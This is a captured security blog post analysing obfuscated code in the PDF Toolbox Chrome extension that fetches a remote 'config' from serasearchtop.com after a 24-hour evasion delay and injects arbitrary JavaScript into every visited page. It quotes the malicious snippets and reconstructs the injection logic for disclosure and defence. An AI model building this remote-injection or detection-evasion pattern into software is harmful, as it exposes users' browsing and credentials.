---
url: https://palant.info/2023/05/16/malicious-code-in-pdf-toolbox-extension/
captured_at: '2026-04-17'
capture_method: script
source_type: blog
source_id: palant
title_at_capture: Malicious code in PDF Toolbox extension | Almost Secure
author: Wladimir Palant
evidence_class: c
topics:
  - security
  - malicious-extensions
  - pdf-toolbox
  - supply-chain
wayback_url: null
related_docs: []
notes: Fill in during curation.
---

# Malicious code in PDF Toolbox extension | Almost Secure

## Signal extracted

<!-- Fill in during curation. The one insight this post has that's hard to get elsewhere. -->

---

The PDF Toolbox extension for Google Chrome has more than 2 million users and an average rating of 4,2 in the Chrome Web Store. So I was rather surprised to discover obfuscated code in it that has apparently gone unnoticed for at least a year.

The code has been made to look like a legitimate extension API wrapper, merely with some convoluted logic on top. It takes a closer look to recognize unexpected functionality here, and quite some more effort to understand what it is doing.

This code allows serasearchtop\[.\]com website to inject arbitrary JavaScript code into all websites you visit. While it is impossible for me to tell what this is being used for, the most likely use is injecting ads. More nefarious uses are also possible however.

**Update** (2023-06-12): The complete list of extension IDs from this article series can be found [here](https://codeberg.org/palant/malicious-extensions-list/raw/main/list.txt). This repository also contains the [check-extensions command-line utility](https://codeberg.org/palant/malicious-extensions-list/releases) which will search local browser profiles for these extensions.

#### Contents

-   [What PDF Toolbox does](#what-pdf-toolbox-does)
-   [The “config” file](#the-config-file)
-   [Detection prevention](#detection-prevention)
-   [The “wrapper”](#the-wrapper)
-   [What’s the goal?](#what-s-the-goal)

## [](#what-pdf-toolbox-does)What PDF Toolbox does

The functionality of the PDF Toolbox extension is mostly simple. You click the extension icon and get your options:

![An extension icon showing a Swiss army knife with its pop-up open. The pop-up contains the PDF Toolbox title following by four options: Convert office documents, Merge two PDF files, Append image to PDF file, Download Opened PDFs (0 PDFs opened in your tabs)](https://palant.info/2023/05/16/malicious-code-in-pdf-toolbox-extension/popup.png)

Clicking any of the options opens a new browser tab with the actual functionality. Here you can select the files and do something with them. Most operations are done locally using the [pdf-lib module](https://pdf-lib.js.org/). Only converting Office documents will upload the file to a web server.

And a regular website could do all of this in exactly the same way. In fact, plenty of such websites already exist. So I suspect that the option to download PDFs only exists to justify both this being a browser extension and requiring wide-reaching privileges.

See, in order to check all your tabs for downloadable PDFs this extension requires access to each and every website. A much more obvious extension design would have been: don’t bother with all tabs, check only the current tab when the extension icon is clicked. After all, people rarely trigger an extension because of some long forgotten tab from a week ago. But that would have been doable with a far less powerful [activeTab permission](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/permissions#activetab_permission).

While Chrome Web Store [requires extension developers not to declare unnecessary permissions](https://developer.chrome.com/docs/webstore/program-policies/permissions/), this policy doesn’t seem to be consistently enforced. This extension also requests access to detailed browser tabs information and downloads, but it doesn’t use either.

## [](#the-config-file)The “config” file

So all of the extension functionality is contained in the browser action pop-up and the page opening in a new tab. But it still has a background page which, from the look of it, doesn’t do much: it runs Google Analytics and sets the welcome and uninstall page.

This is standard functionality found in some other extensions as well. It seems to be part of the monetization policy: the pages come from `ladnet.co` and display ads below the actual message, prompting you to install some other browser extensions.

The module called `then-chrome` is unusual however. It in turn loads a module named `api`, and the whole thing looks like wrapping the extension APIs similarly to Mozilla’s [WebExtension API polyfill](https://github.com/mozilla/webextension-polyfill). Which would have been slightly more convincing if there were anything actually using the result.

The `api` module contains the following code:

```
var Iv = TL ?
  "http" + ff + "//s" + qc + "a" + fx + "ar" + document.location.protocol.substring(0, 2) +
    (ad ? "to" : ad) + so + "c" + document.location.protocol.substring(3, 5) + "/cf" + Sr :
  qB;
let oe = Iv;
oe += bo + (Ua + "fg.") + qB + document.location.protocol.substring(14, 16);
```

Weird, right? There are all these inline conditionals that don’t do anything other than obfuscating the logic. `TL` gets `document` assigned to it, `ad` gets `chrome.runtime` as its value – there is no way any of these might be missing.

This is in fact a very convoluted way of constructing a constant string: `https://serasearchtop.com/cfg/bahogceckgcanpcoabcdgmoidngedmfo/cfg.json`. As the next step the extension calls `window.fetch()` in order to download this file:

```
const ax = await window["fet" + document.location.protocol.substring(0, 2)](oe);
if (ax.ok)
{
  const rd = await ax.json();
  (0, af.wrapObject)(chrome, rd)
}
```

Calling `wrapObject` with `chrome` as first parameter makes the impression that this were some harmless configuration data used to wrap extension APIs. The fact that the developers spent so much effort to obfuscate the address and the downloading tells otherwise however.

## [](#detection-prevention)Detection prevention

Before I start going through the “wrapper,” there is another piece of logic worth mentioning. Somebody probably thought that the extension making a request to serasearchtop\[.\]com immediately upon installation would draw suspicions. While it isn’t clear what this domain does or who is behind it, it managed to get onto a bunch of anti-tracking blocking lists.

So rather than making the request immediately, the extension waits 24 hours. This logic is also obfuscated. It looks like this (slightly cleaned up):

```
const rd = localStorage;
const qJ = "cfg";
const oe = Date.now();
var ax = rd.getItem(qJ);
const PB = 9993592013;
if (ax)
{
  const rd = PB - ax
  const qJ = oe - rd;
  if (qJ < (TL ? 0 : rd) || qJ > (ad ? 87217164 : TC))
  {
    // Download logic here
  }
}
else
{
  ax = PB - oe;
  rd.setItem(qJ, ax)
}
```

You can again ignore the inline conditionals: both conditions are always true. The `PB` constant is only being used to somewhat mess up the timestamp when it is being stored in `localStorage.cfg`. But `qJ` becomes the number of milliseconds since the first extension start. And `87217164` is slightly more than the number of milliseconds in 24 hours.

So one only has to change the timestamp in `localStorage.cfg` for the request to the “configuration” file to happen. For me, only an empty JSON file is being returned however. I suspect that this is another detection prevention mechanism on the server side. There is a cookie being set, so it will likely take some time for me to get a real response here. Maybe there is also some geo-blocking here or other conditions.

## [](#the-wrapper)The “wrapper”

The `wrapper` module is where the config processing happens. The logic is again unnecessarily convoluted but it expects a config file like this:

```
{
  "something2.func2": "JSON-stringified parameters",
  "something1.func1": "this is ignored"
}
```

The code relies on [Object.entries()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries) implementation in Chrome listing object entries in a particular order. It will take the global scope of the extension’s background page and look up the functions listed in the keys. And it will call them in a very specific way:

```
something1.func1(x =>
{
  something2.func2(x, params2, () =>
  {
    chrome.runtime.lastError;
  });
});
```

Now I haven’t seen any proper “config” data, so I don’t really know what this is supposed to do. But the callbacks passed in and `chrome.runtime.lastError` indicate that `something1.func1` and `something2.func2` are meant to be extension API methods. And given what the extension has access to, it’s either [tabs](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs), [windows](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/windows) or [downloads](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/downloads) API.

It took me some time to find a parameter-less API that would call the callback with a value that could be passed to another API call. In the end I realized that the first call is adding a listener. Most likely, `something1.func1` is `chrome.tabs.onUpdated.addListener`. This also explains why `chrome.runtime.lastError` isn’t being checked for the first call, it is unnecessary when adding a listener.

The tab update listener will be called regularly, and its first parameter is the tab ID. Which can be passed to a number of extension APIs. Given that there is no further logic here, only one call makes sense: `chrome.tabs.executeScript`. So the wrapper is meant to run code like this:

```
chrome.tabs.onUpdated.addListener(tabId =>
{
  chrome.tabs.executeScript(tabId, {code: "arbitrary JavaScript code"}, () =>
  {
    chrome.runtime.lastError;
  });
});
```

Effectively, the “config” file downloaded from serasearchtop\[.\]com can give the extension arbitrary JavaScript code that will be injected into every web page being opened.

## [](#what-s-the-goal)What’s the goal?

As I’ve never seen the code being injected, we are now entering the realm of speculations. Most likely, the goal of this code is monetizing the browser extension in ways that are prohibited by the Chrome Web Store policies. Which usually means: injecting ads into websites.

One would expect users to notice however. With the latest PDF Toolbox version being published in January 2022, this has been going on for more than a year. It might have been even longer if previous versions contained this malicious code as well. Yet not one of the two million users complains in an extension review about ads. I can see a number of explanations for that:

-   The user numbers have been artificially inflated and the real user count is far lower than two million.
-   The functionality is not active, the server gives everyone an empty config file.
-   The functionality is only active in some regions, particularly those where people are unlikely to come complain in the Chrome Web Store.
-   The code is not injecting ads but rather doing something less obvious.

Concerning the latest bullet point, I see a number of options. A less visible monetization alternative would be injecting cryptocurrency mining code into websites. Maybe it’s that.

Or maybe it’s something that users have almost no chance of detecting: data collection. Maybe the injected code is collecting browsing profiles. Or something more nefarious: it could be collecting online banking credentials and credit card numbers as these are being entered into websites.

Yes, these are pure speculations. It could be anything.

## Curator notes

<!-- Empty at capture time. -->
